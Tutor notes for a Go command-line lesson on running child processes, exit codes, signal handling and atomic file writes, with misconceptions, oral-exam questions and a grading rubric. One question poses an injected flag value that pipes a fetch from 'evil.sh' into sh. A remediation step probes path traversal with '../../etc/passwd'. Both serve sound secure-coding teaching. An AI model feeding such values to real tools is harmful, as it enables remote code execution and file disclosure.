# Tutor notes — Files, Processes & Signals

## Where the learner is

Fourth lesson of the CLI focus pack. They can layer configuration with a
documented precedence chain (flags-config), build and test a cobra command tree
in-process (cobra), and split data from diagnostics with output that degrades
when piped (terminal-ux). From S3 they own interfaces, `errors.Is`/`As` with
`%w`, table-driven tests, JSON, and the whole concurrency arc including
`context` — which is the hook for the entire signals section here: a signal is
just another way a context becomes done.

What is new is that the program now talks to the operating system, where the
correct answer differs per platform and the failure modes are other people's
machines. Three ideas carry the lesson: an argument array is not a command line;
a non-zero exit is data, not an error; and a file is replaced, never edited in
place.

They have **not** done TDD, SQL, HTTP servers, security or profiling — those are
S4 and later. Keep examples inside processes, files and streams.

## Common misconceptions

- **"I need `sh -c` to run a command."** No: `exec.Command` runs an executable
  directly. Ask what the shell would have been *for*, and whether they want any
  of it applied to a value from a config file.
- **"Quoting/escaping makes the string safe."** Different rules per shell and
  per platform; one gap is remote code execution. Separation beats sanitising.
- **A non-zero exit treated as a Go error** (or worse, as a crash). `grep` exits
  1 for "no match". The status is a result field.
- **`CombinedOutput` everywhere** — throws away the stream split the previous
  lesson spent an hour on, and cannot be undone downstream.
- **Reading the output buffers before `Wait` returns.** The copy goroutines are
  still writing; `-race` will say so.
- **`cmd.Env = []string{"KEY=v"}`** — that *replaces* the environment. The child
  loses `PATH` and `HOME`, and the failure is bizarre. `append(os.Environ(), …)`.
- **Trusting the error to explain a timeout.** A context-killed child returns an
  ordinary `*exec.ExitError` (`signal: killed`). `ctx.Err()` must be checked
  first — this is the single most valuable ordering detail in the lesson.
- **Assuming killing the child kills its grandchildren**, and being surprised
  when `Wait` blocks after a kill. Mention `WaitDelay` and process groups.
- **Slow work in a signal handler** — flushing, uploading, waiting on a lock.
  The handler flips a context; the ordinary code does the work.
- **`os.Exit` on the signal path**, which skips every `defer` and leaves the
  terminal, the lock file and the temp file behind.
- **"SIGKILL can be handled if I'm careful."** It cannot. Nor SIGSTOP.
- **"`os.WriteFile` is fine, writes are fast."** Truncate-then-write has a window
  that is small until the disk is full or the machine reboots.
- **Temp file in `os.TempDir()`**, then `EXDEV` on a machine with a separate
  `/home`. The temp file goes in the target's directory.
- **Skipping `Sync`, or ignoring `Close`'s error** — the two places a write
  actually fails.
- **`filepath.Join` treated as a security boundary.** It cleans; cleaning
  resolves `..` into a real escape. `filepath.IsLocal` is the check, and even it
  says nothing about symlinks.
- **`path.Join` on filenames**, or hand-built `os.Getenv("HOME") + "/.config"`,
  which is wrong on macOS and Windows both.
- **Cache written into the config directory** (or the reverse). Ask what should
  survive `rm -rf` of each.

## Grilling points

- "Your tool takes a `--branch` flag and runs git with it. Someone passes
  `main; curl evil.sh | sh`. Walk me through what happens in your code, and what
  would have happened if you had built a string."
- "`grep` exits 1. Did anything go wrong? How does your `Result` say so, and what
  would the caller do differently for exit 2?"
- "Your command was killed. Was that a timeout, a `kill` from an operator, or a
  segfault? Show me the code that decides, and what breaks if you reorder it."
- "The tests never run `sleep` or `echo`. What *is* the child process, and how
  does it know to behave like a program instead of a test suite?" Then: "What
  happens if `TUTOR_HELPER_MODE` is set in your shell when you run `go test`?"
- "I press Ctrl-C while your tool is halfway through writing the config. What
  exactly happens, in order, until the process is gone?"
- "Where in your program is the code that reacts to SIGTERM, and how much time
  does it have?" (A grace period exists; SIGKILL follows.)
- "What does exit code 130 mean, who reads it, and where did the number come
  from?"
- "Talk me through the temp-file dance. Which step protects against a crash,
  which against a reader arriving mid-write, and which against a full disk?"
- "Why must the temp file live in the same directory as the target?"
- "`filepath.Join(root, userPath)` — convince me it stays under `root`. Now
  convince me again when `root` contains a symlink."
- "Your tool stores a 400MB index. Config dir or cache dir? What is the user
  entitled to do to each?"
- "Which of your functions would need to change to also run children in their own
  process group on Unix, and how would you keep it compiling on Windows?"

## Grading rubric

- **A** — All tests pass under `-race`. `Run` checks `ctx.Err()` before
  interpreting the exit status, uses `errors.As` for `*exec.ExitError`, and wraps
  everything else with `%w`; `Env` is built on `os.Environ()`; `RunSteps` stops
  cleanly and its `StepError` unwraps; `WriteFileAtomic` does temp-in-target-dir,
  chmod, sync, checked close, rename, with a `defer os.Remove` covering every
  path; validation uses `filepath.IsLocal` rather than a hand-rolled `..` check.
  The learner can explain injection, the exit-code contract and the crash window
  in their own words.
- **B** — Tests pass with roughness: a `Sync` or a checked `Close` missing, error
  messages that lose the command name, `ExitCodeFor` written as a chain of `==`
  comparisons that happens to work because nothing wrapped the error yet, a
  `strings.HasPrefix` path check that is correct here but not on Windows.
- **C** — Tests pass only after heavy hinting, or the code is right while the
  reasoning is not: cannot say why the ctx check comes first, or thinks the temp
  file is "just tidiness". Pass only if remediation lands in session.
- **Fail** — Tests failing; or a shell reintroduced (`sh -c` with interpolation);
  or the learner sees no problem with `os.Exit` in the signal path. Remediate,
  don't advance.

## Remediation ladder

1. "Run one test at a time: `go test -race -run TestRunDeadline -v`. Read what it
   expected and what it got, then say out loud what the child's error looked
   like."
2. For the deadline test: "Your child was killed. Print the error `Run` got from
   `cmd.Run()` — is it an `*exec.ExitError`? So who else knows a deadline
   expired?" (Only `ctx`.) Let them find the ordering themselves.
3. For the environment test: "Print `len(cmd.Env)` just before `Start`. What did
   the child's `PATH` look like?"
4. For the atomic write: "List the directory after your write with
   `os.ReadDir`. Now put a `return errors.New("boom")` right before the rename
   and list it again."
5. For paths: "Print `filepath.Join(root, "../../etc/passwd")`. Is that inside
   `root`? What does `filepath.IsLocal` say about the input?"
6. If the helper-process idiom itself is the blocker, walk `TestMain` through
   verbally — "the binary is started twice; what is different the second time?"
   — and have them add a temporary print in `helperProcess`.
7. Never hand over `Run` whole. The ordering of the three error cases is the
   lesson; give the questions, not the switch statement.

## After passing

Preview: "You have a tool that behaves well on your machine. Next: getting it
onto other people's — versioning, `-ldflags` stamping a `--version`,
cross-compiling for platforms you do not own, and what goreleaser and a Homebrew
tap actually do for you."
